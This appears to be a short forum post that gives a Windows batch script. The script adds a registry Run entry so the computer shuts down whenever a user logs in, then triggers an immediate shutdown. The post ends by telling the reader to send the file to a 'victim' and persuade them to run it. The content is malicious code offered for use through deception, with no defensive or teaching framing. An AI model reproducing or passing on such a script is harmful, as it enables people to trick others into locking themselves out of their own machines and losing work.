There is a way to make the computer shut down once the user logs in
Make a new txt file and save it as whatever.bat, add the following commands to it:

@ECHO off CLS ECHO REGEDIT4 >> temp.reg ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> temp.reg ECHO "ownage"="shutdown.exe -s -t 00" >> temp.reg REM Remember to enter in two NUMERIC zeroes (00) after -t in the line above, REM and not the letter "O" REGEDIT.EXE /s temp.reg SHUTDOWN.EXE -s -t 00
Send it to the victim and tell them to run it
